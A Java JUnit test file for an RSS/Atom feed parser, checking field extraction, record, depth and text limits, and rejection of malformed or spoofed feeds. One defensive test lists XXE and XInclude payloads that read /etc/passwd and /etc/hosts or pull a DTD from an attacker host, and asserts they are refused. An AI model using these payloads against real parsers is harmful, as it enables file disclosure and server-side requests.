package com.vhvkhangg.personalprivatevault.feed.internal.infrastructure.rss;

import com.vhvkhangg.personalprivatevault.feed.source.exception.FeedRefreshException;
import com.vhvkhangg.personalprivatevault.feed.source.exception.FeedRefreshFailureReason;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import java.nio.charset.StandardCharsets;
import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

class RssAtomParserTest {

    private RssAtomParser parser;

    @BeforeEach
    void setUp() {
        parser = new RssAtomParser();
    }

    @Test
    @DisplayName("Valid RSS 2.0 document parses items, fields, and returns correct record count")
    void validRssParsesCorrectly() {
        String xml = """
                <?xml version="1.0" encoding="UTF-8"?>
                <rss version="2.0">
                  <channel>
                    <title>Tech News</title>
                    <link>https://example.com</link>
                    <item>
                      <title>Article One</title>
                      <link>https://example.com/art1</link>
                      <guid>guid-1</guid>
                      <author>author@example.com</author>
                      <pubDate>Mon, 04 Nov 2026 10:00:00 GMT</pubDate>
                    </item>
                    <item>
                      <title>Article Two</title>
                      <link>https://example.com/art2</link>
                      <guid>guid-2</guid>
                    </item>
                  </channel>
                </rss>
                """;

        RssAtomParser.ParsedFeed feed = parser.parseFeed(xml.getBytes(StandardCharsets.UTF_8));

        assertThat(feed.format()).isEqualTo(RssAtomParser.FeedFormat.RSS_2_0);
        assertThat(feed.parsedEntriesCount()).isEqualTo(2);
        assertThat(feed.rawEntries()).hasSize(2);

        RssAtomParser.RawEntry entry1 = feed.rawEntries().get(0);
        assertThat(entry1.title()).isEqualTo("Article One");
        assertThat(entry1.link()).isEqualTo("https://example.com/art1");
        assertThat(entry1.provenanceId()).isEqualTo("guid-1");
        assertThat(entry1.author()).isEqualTo("author@example.com");
        assertThat(entry1.pubDate()).isEqualTo("Mon, 04 Nov 2026 10:00:00 GMT");

        RssAtomParser.RawEntry entry2 = feed.rawEntries().get(1);
        assertThat(entry2.title()).isEqualTo("Article Two");
        assertThat(entry2.link()).isEqualTo("https://example.com/art2");
        assertThat(entry2.provenanceId()).isEqualTo("guid-2");
    }

    @Test
    @DisplayName("Valid Atom 1.0 document parses entries, alternate links, authors, and dates")
    void validAtomParsesCorrectly() {
        String xml = """
                <?xml version="1.0" encoding="UTF-8"?>
                <feed xmlns="http://www.w3.org/2005/Atom">
                  <title>Atom Tech</title>
                  <id>https://example.com/atom</id>
                  <entry>
                    <title>Atom Article</title>
                    <link rel="self" href="https://example.com/self"/>
                    <link rel="alternate" href="https://example.com/atom-1"/>
                    <id>urn:uuid:12345</id>
                    <author><name>Alice</name></author>
                    <published>2026-11-04T09:00:00Z</published>
                    <updated>2026-11-04T09:30:00Z</updated>
                  </entry>
                </feed>
                """;

        RssAtomParser.ParsedFeed feed = parser.parseFeed(xml.getBytes(StandardCharsets.UTF_8));

        assertThat(feed.format()).isEqualTo(RssAtomParser.FeedFormat.ATOM_1_0);
        assertThat(feed.parsedEntriesCount()).isEqualTo(1);
        assertThat(feed.rawEntries()).hasSize(1);

        RssAtomParser.RawEntry entry = feed.rawEntries().get(0);
        assertThat(entry.title()).isEqualTo("Atom Article");
        assertThat(entry.link()).isEqualTo("https://example.com/atom-1");
        assertThat(entry.provenanceId()).isEqualTo("urn:uuid:12345");
        assertThat(entry.author()).isEqualTo("Alice");
        assertThat(entry.pubDate()).isEqualTo("2026-11-04T09:00:00Z");
        assertThat(entry.updated()).isEqualTo("2026-11-04T09:30:00Z");
    }

    @Test
    @DisplayName("Valid empty RSS feed reports 0 parsed entries and empty list")
    void validEmptyRssReportsZero() {
        String xml = """
                <?xml version="1.0" encoding="UTF-8"?>
                <rss version="2.0">
                  <channel>
                    <title>Empty</title>
                    <link>https://example.com</link>
                  </channel>
                </rss>
                """;

        RssAtomParser.ParsedFeed feed = parser.parseFeed(xml.getBytes(StandardCharsets.UTF_8));
        assertThat(feed.format()).isEqualTo(RssAtomParser.FeedFormat.RSS_2_0);
        assertThat(feed.parsedEntriesCount()).isEqualTo(0);
        assertThat(feed.rawEntries()).isEmpty();
    }

    @Test
    @DisplayName("Valid empty Atom feed reports 0 parsed entries and empty list")
    void validEmptyAtomReportsZero() {
        String xml = """
                <?xml version="1.0" encoding="UTF-8"?>
                <feed xmlns="http://www.w3.org/2005/Atom">
                  <title>Empty Atom</title>
                  <id>https://example.com</id>
                </feed>
                """;

        RssAtomParser.ParsedFeed feed = parser.parseFeed(xml.getBytes(StandardCharsets.UTF_8));
        assertThat(feed.format()).isEqualTo(RssAtomParser.FeedFormat.ATOM_1_0);
        assertThat(feed.parsedEntriesCount()).isEqualTo(0);
        assertThat(feed.rawEntries()).isEmpty();
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "<!DOCTYPE rss [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><rss version=\"2.0\"><channel><item><title>&xxe;</title></item></channel></rss>",
            "<!DOCTYPE feed [ <!ENTITY % pe SYSTEM \"http://attacker.com/evil.dtd\"> %pe; ]><feed xmlns=\"http://www.w3.org/2005/Atom\"></feed>",
            "<rss version=\"2.0\"><channel><item><xi:include href=\"http://attacker.com/foo\" xmlns:xi=\"http://www.w3.org/2001/XInclude\"/></item></channel></rss>",
            "<feed xmlns=\"http://www.w3.org/2005/Atom\"><include href=\"file:///etc/hosts\" xmlns=\"http://www.w3.org/2003/XInclude\"/></feed>"
    })
    @DisplayName("Hostile XML constructs (DTD, external entities, XInclude) are rejected with UPSTREAM_INVALID_RESPONSE")
    void hostileXmlConstructsFail(String hostileXml) {
        assertThatThrownBy(() -> parser.parseFeed(hostileXml.getBytes(StandardCharsets.UTF_8)))
                .isInstanceOf(FeedRefreshException.class)
                .satisfies(ex -> assertThat(((FeedRefreshException) ex).getReason())
                        .isEqualTo(FeedRefreshFailureReason.UPSTREAM_INVALID_RESPONSE));
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "<feed xmlns=\"http://attacker.com/Atom\"><title>Spoofed</title></feed>",
            "<rss xmlns=\"http://purl.org/rss/1.0/\"><channel></channel></rss>",
            "<rss version=\"1.0\"><channel></channel></rss>",
            "<html><body>Not a feed</body></html>",
            "<rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"></rdf:RDF>"
    })
    @DisplayName("Invalid or spoofed feed dialects/namespaces are rejected with UPSTREAM_INVALID_RESPONSE")
    void invalidDialectsFail(String dialectXml) {
        assertThatThrownBy(() -> parser.parseFeed(dialectXml.getBytes(StandardCharsets.UTF_8)))
                .isInstanceOf(FeedRefreshException.class)
                .satisfies(ex -> assertThat(((FeedRefreshException) ex).getReason())
                        .isEqualTo(FeedRefreshFailureReason.UPSTREAM_INVALID_RESPONSE));
    }

    @Test
    @DisplayName("Document exceeding 200 records cap throws FETCH_LIMIT_EXCEEDED")
    void exceedingRecordCapThrows() {
        StringBuilder sb = new StringBuilder("<?xml version=\"1.0\"?><rss version=\"2.0\"><channel>");
        for (int i = 0; i < 201; i++) {
            sb.append("<item><title>Item ").append(i).append("</title><link>https://example.com/").append(i).append("</link></item>");
        }
        sb.append("</channel></rss>");

        assertThatThrownBy(() -> parser.parseFeed(sb.toString().getBytes(StandardCharsets.UTF_8)))
                .isInstanceOf(FeedRefreshException.class)
                .satisfies(ex -> assertThat(((FeedRefreshException) ex).getReason())
                        .isEqualTo(FeedRefreshFailureReason.FETCH_LIMIT_EXCEEDED));
    }

    @Test
    @DisplayName("Document exceeding maximum nesting depth (32) throws FETCH_LIMIT_EXCEEDED")
    void exceedingDepthCapThrows() {
        StringBuilder sb = new StringBuilder("<rss version=\"2.0\"><channel><item>");
        for (int i = 0; i < 35; i++) {
            sb.append("<level").append(i).append(">");
        }
        sb.append("deep");
        for (int i = 34; i >= 0; i--) {
            sb.append("</level").append(i).append(">");
        }
        sb.append("</item></channel></rss>");

        assertThatThrownBy(() -> parser.parseFeed(sb.toString().getBytes(StandardCharsets.UTF_8)))
                .isInstanceOf(FeedRefreshException.class)
                .satisfies(ex -> assertThat(((FeedRefreshException) ex).getReason())
                        .isEqualTo(FeedRefreshFailureReason.FETCH_LIMIT_EXCEEDED));
    }

    @Test
    @DisplayName("Document exceeding 1 MiB text code units throws FETCH_LIMIT_EXCEEDED")
    void exceedingTextCapThrows() {
        // String of 1,048,577 characters in comment/character content
        String bigChunk = "a".repeat(10000);
        StringBuilder sb = new StringBuilder("<rss version=\"2.0\"><channel>");
        for (int i = 0; i < 110; i++) {
            sb.append("<!-- ").append(bigChunk).append(" -->");
        }
        sb.append("</channel></rss>");

        assertThatThrownBy(() -> parser.parseFeed(sb.toString().getBytes(StandardCharsets.UTF_8)))
                .isInstanceOf(FeedRefreshException.class)
                .satisfies(ex -> assertThat(((FeedRefreshException) ex).getReason())
                        .isEqualTo(FeedRefreshFailureReason.FETCH_LIMIT_EXCEEDED));
    }

    @Test
    @DisplayName("Malformed XML tail after valid items fails atomically with UPSTREAM_INVALID_RESPONSE")
    void malformedTailFailsAtomically() {
        String xml = """
                <rss version="2.0">
                  <channel>
                    <item><title>Item 1</title><link>https://example.com/1</link></item>
                    <item><title>Item 2</title><link>https://example.com/2</link></item>
                  </channel>
                  <unclosed>
                """;

        assertThatThrownBy(() -> parser.parseFeed(xml.getBytes(StandardCharsets.UTF_8)))
                .isInstanceOf(FeedRefreshException.class)
                .satisfies(ex -> assertThat(((FeedRefreshException) ex).getReason())
                        .isEqualTo(FeedRefreshFailureReason.UPSTREAM_INVALID_RESPONSE));
    }

    @Test
    @DisplayName("FR-03/06: Exact 20,000 StAX events passes and 20,001 events throws FETCH_LIMIT_EXCEEDED")
    void eventCountExactAndOneOverBoundaries() {
        String passXml = "<rss version=\"2.0\"><channel>" + "<!-- -->".repeat(19994) + "</channel></rss>";
        RssAtomParser.ParsedFeed passFeed = parser.parseFeed(passXml.getBytes(StandardCharsets.UTF_8));
        assertThat(passFeed.parsedEntriesCount()).isZero();

        String failXml = "<rss version=\"2.0\"><channel>" + "<!-- -->".repeat(19995) + "</channel></rss>";
        assertThatThrownBy(() -> parser.parseFeed(failXml.getBytes(StandardCharsets.UTF_8)))
                .isInstanceOf(FeedRefreshException.class)
                .satisfies(ex -> assertThat(((FeedRefreshException) ex).getReason())
                        .isEqualTo(FeedRefreshFailureReason.FETCH_LIMIT_EXCEEDED));
    }

    @Test
    @DisplayName("FR-03: Foreign extension element (e.g. x:title) is ignored in favor of unnamespaced title")
    void foreignExtensionTitleIgnored() {
        String xml = """
                <rss version="2.0">
                  <channel>
                    <item>
                      <x:title xmlns:x="urn:extension">Extension title</x:title>
                      <title>Actual title</title>
                      <link>https://example.com/article</link>
                    </item>
                  </channel>
                </rss>
                """;
        RssAtomParser.ParsedFeed feed = parser.parseFeed(xml.getBytes(StandardCharsets.UTF_8));
        assertThat(feed.rawEntries()).hasSize(1);
        assertThat(feed.rawEntries().get(0).title()).isEqualTo("Actual title");
    }

    @Test
    @DisplayName("FR-03: Nested title or link inside description does not override article fields")
    void nestedDescriptionElementsIgnored() {
        String xml = """
                <rss version="2.0">
                  <channel>
                    <item>
                      <description><title>Nested title</title><link>https://example.com/nested</link></description>
                      <title>Actual title</title>
                      <link>https://example.com/actual</link>
                    </item>
                  </channel>
                </rss>
                """;
        RssAtomParser.ParsedFeed feed = parser.parseFeed(xml.getBytes(StandardCharsets.UTF_8));
        assertThat(feed.rawEntries()).hasSize(1);
        assertThat(feed.rawEntries().get(0).title()).isEqualTo("Actual title");
        assertThat(feed.rawEntries().get(0).link()).isEqualTo("https://example.com/actual");
    }

    @Test
    @DisplayName("FR-03: RSS item directly under rss root without channel is rejected")
    void missingChannelRejected() {
        String xml = "<rss version=\"2.0\"><item><title>A</title><link>https://example.com/a</link></item></rss>";
        assertThatThrownBy(() -> parser.parseFeed(xml.getBytes(StandardCharsets.UTF_8)))
                .isInstanceOf(FeedRefreshException.class)
                .satisfies(ex -> assertThat(((FeedRefreshException) ex).getReason())
                        .isEqualTo(FeedRefreshFailureReason.UPSTREAM_INVALID_RESPONSE));
    }

    @Test
    @DisplayName("FR-03: Multiple channels in RSS feed is rejected")
    void multipleChannelsRejected() {
        String xml = "<rss version=\"2.0\"><channel><title>C1</title></channel><channel><title>C2</title></channel></rss>";
        assertThatThrownBy(() -> parser.parseFeed(xml.getBytes(StandardCharsets.UTF_8)))
                .isInstanceOf(FeedRefreshException.class)
                .satisfies(ex -> assertThat(((FeedRefreshException) ex).getReason())
                        .isEqualTo(FeedRefreshFailureReason.UPSTREAM_INVALID_RESPONSE));
    }

    @Test
    @DisplayName("FR-03: Unqualified entry (xmlns=\"\") under Atom feed is rejected")
    void unqualifiedAtomEntryRejected() {
        String xml = "<feed xmlns=\"http://www.w3.org/2005/Atom\"><entry xmlns=\"\"><title>A</title><link href=\"https://example.com/a\"/></entry></feed>";
        assertThatThrownBy(() -> parser.parseFeed(xml.getBytes(StandardCharsets.UTF_8)))
                .isInstanceOf(FeedRefreshException.class)
                .satisfies(ex -> assertThat(((FeedRefreshException) ex).getReason())
                        .isEqualTo(FeedRefreshFailureReason.UPSTREAM_INVALID_RESPONSE));
    }

    @Test
    @DisplayName("FR-03: dc:date is not promoted to pubDate in RSS 2.0")
    void dcDateNotPromotedToPubDate() {
        String xml = """
                <rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/">
                  <channel>
                    <item>
                      <title>Item</title>
                      <link>https://example.com/item</link>
                      <dc:date>2026-11-04T12:00:00Z</dc:date>
                    </item>
                  </channel>
                </rss>
                """;
        RssAtomParser.ParsedFeed feed = parser.parseFeed(xml.getBytes(StandardCharsets.UTF_8));
        assertThat(feed.rawEntries()).hasSize(1);
        assertThat(feed.rawEntries().get(0).pubDate()).isNull();
    }

    @Test
    @DisplayName("FR-03: RSS feed with zero channels (<rss version=\"2.0\"/> or empty rss) is rejected at document completion")
    void zeroChannelRssRejectedAtDocumentEnd() {
        for (String xml : List.of("<rss version=\"2.0\"/>", "<rss version=\"2.0\"></rss>", "<rss version=\"2.0\">   </rss>")) {
            assertThatThrownBy(() -> parser.parseFeed(xml.getBytes(StandardCharsets.UTF_8)))
                    .isInstanceOf(FeedRefreshException.class)
                    .satisfies(ex -> {
                        assertThat(((FeedRefreshException) ex).getReason())
                                .isEqualTo(FeedRefreshFailureReason.UPSTREAM_INVALID_RESPONSE);
                        assertThat(ex.getMessage()).contains("exactly one channel element");
                    });
        }
    }

    @Test
    @DisplayName("FR-03: Valid empty RSS feed with exactly one channel succeeds returning zero entries")
    void validEmptyRssWithOneChannelSucceeds() {
        String xml = "<rss version=\"2.0\"><channel><title>Empty Channel</title><link>https://example.com</link></channel></rss>";
        RssAtomParser.ParsedFeed feed = parser.parseFeed(xml.getBytes(StandardCharsets.UTF_8));
        assertThat(feed.format()).isEqualTo(RssAtomParser.FeedFormat.RSS_2_0);
        assertThat(feed.parsedEntriesCount()).isEqualTo(0);
        assertThat(feed.rawEntries()).isEmpty();
    }

    @Test
    @DisplayName("FR-06: Record count boundary: 200 records passes, 201 records fails with FETCH_LIMIT_EXCEEDED")
    void recordCountExactAndOneOverBoundary() {
        StringBuilder sb200 = new StringBuilder("<rss version=\"2.0\"><channel><title>T</title>");
        for (int i = 0; i < 200; i++) {
            sb200.append("<item><title>Item ").append(i).append("</title><link>https://example.com/").append(i).append("</link></item>");
        }
        sb200.append("</channel></rss>");
        RssAtomParser.ParsedFeed feed200 = parser.parseFeed(sb200.toString().getBytes(StandardCharsets.UTF_8));
        assertThat(feed200.parsedEntriesCount()).isEqualTo(200);

        StringBuilder sb201 = new StringBuilder("<rss version=\"2.0\"><channel><title>T</title>");
        for (int i = 0; i < 201; i++) {
            sb201.append("<item><title>Item ").append(i).append("</title><link>https://example.com/").append(i).append("</link></item>");
        }
        sb201.append("</channel></rss>");
        assertThatThrownBy(() -> parser.parseFeed(sb201.toString().getBytes(StandardCharsets.UTF_8)))
                .isInstanceOf(FeedRefreshException.class)
                .satisfies(ex -> assertThat(((FeedRefreshException) ex).getReason())
                        .isEqualTo(FeedRefreshFailureReason.FETCH_LIMIT_EXCEEDED));
    }

    @Test
    @DisplayName("FR-06: Element depth boundary: depth 32 passes, depth 33 fails with FETCH_LIMIT_EXCEEDED")
    void depthExactAndOneOverBoundary() {
        StringBuilder depth32 = new StringBuilder("<rss version=\"2.0\"><channel><title>T</title><item><title>T</title><link>https://example.com</link>");
        for (int i = 0; i < 29; i++) depth32.append("<w").append(i).append(">");
        for (int i = 28; i >= 0; i--) depth32.append("</w").append(i).append(">");
        depth32.append("</item></channel></rss>");
        RssAtomParser.ParsedFeed feed32 = parser.parseFeed(depth32.toString().getBytes(StandardCharsets.UTF_8));
        assertThat(feed32.parsedEntriesCount()).isEqualTo(1);

        StringBuilder depth33 = new StringBuilder("<rss version=\"2.0\"><channel><title>T</title><item><title>T</title><link>https://example.com</link>");
        for (int i = 0; i < 30; i++) depth33.append("<w").append(i).append(">");
        for (int i = 29; i >= 0; i--) depth33.append("</w").append(i).append(">");
        depth33.append("</item></channel></rss>");
        assertThatThrownBy(() -> parser.parseFeed(depth33.toString().getBytes(StandardCharsets.UTF_8)))
                .isInstanceOf(FeedRefreshException.class)
                .satisfies(ex -> assertThat(((FeedRefreshException) ex).getReason())
                        .isEqualTo(FeedRefreshFailureReason.FETCH_LIMIT_EXCEEDED));
    }

    @Test
    @DisplayName("FR-06: Malformed tail after 50 valid groups causes atomic failure with UPSTREAM_INVALID_RESPONSE")
    void malformedTailAfter50ValidGroupsFails() {
        StringBuilder sb = new StringBuilder("<rss version=\"2.0\"><channel><title>T</title>");
        for (int i = 0; i < 50; i++) {
            sb.append("<item><title>Item ").append(i).append("</title><link>https://example.com/").append(i).append("</link></item>");
        }
        sb.append("<item><title>Unclosed item</channel></rss>");
        assertThatThrownBy(() -> parser.parseFeed(sb.toString().getBytes(StandardCharsets.UTF_8)))
                .isInstanceOf(FeedRefreshException.class)
                .satisfies(ex -> assertThat(((FeedRefreshException) ex).getReason())
                        .isEqualTo(FeedRefreshFailureReason.UPSTREAM_INVALID_RESPONSE));
    }

    @Test
    @DisplayName("FR-06: Split CDATA sections retain complete untruncated original GUID (> 8192 chars)")
    void splitCdataSectionsRetainFullOriginalId() {
        String prefix8192 = "A".repeat(8192);
        String xml = """
                <rss version="2.0">
                  <channel>
                    <title>Test</title>
                    <item>
                      <title>First Z</title>
                      <link>https://example.com/article</link>
                      <guid><![CDATA[%s]]><![CDATA[z]]></guid>
                    </item>
                    <item>
                      <title>Second A</title>
                      <link>https://example.com/article</link>
                      <guid><![CDATA[%s]]><![CDATA[a]]></guid>
                    </item>
                  </channel>
                </rss>
                """.formatted(prefix8192, prefix8192);

        RssAtomParser.ParsedFeed feed = parser.parseFeed(xml.getBytes(StandardCharsets.UTF_8));
        assertThat(feed.rawEntries()).hasSize(2);
        assertThat(feed.rawEntries().get(0).provenanceId()).isEqualTo(prefix8192 + "z");
        assertThat(feed.rawEntries().get(1).provenanceId()).isEqualTo(prefix8192 + "a");
        assertThat(feed.rawEntries().get(0).provenanceId()).hasSize(8193);
        assertThat(feed.rawEntries().get(1).provenanceId()).hasSize(8193);
    }

    @Test
    @DisplayName("FR-06: Isolated text boundary: 1,048,576 code units passes, 1,048,577 code units fails with FETCH_LIMIT_EXCEEDED")
    void textExactAndOneOverBoundary() {
        String baseStart = "<rss version=\"2.0\"><channel><item><title>";
        String baseEnd = "</title></item></channel></rss>";
        String text1048576 = "A".repeat(1048576);
        String xmlPass = baseStart + text1048576 + baseEnd;
        RssAtomParser.ParsedFeed feed = parser.parseFeed(xmlPass.getBytes(StandardCharsets.UTF_8));
        assertThat(feed.parsedEntriesCount()).isEqualTo(1);
        assertThat(feed.rawEntries().get(0).title()).hasSize(1048576);

        String text1048577 = "A".repeat(1048577);
        String xmlFail = baseStart + text1048577 + baseEnd;
        assertThatThrownBy(() -> parser.parseFeed(xmlFail.getBytes(StandardCharsets.UTF_8)))
                .isInstanceOf(FeedRefreshException.class)
                .satisfies(ex -> assertThat(((FeedRefreshException) ex).getReason())
                        .isEqualTo(FeedRefreshFailureReason.FETCH_LIMIT_EXCEEDED));
    }
}
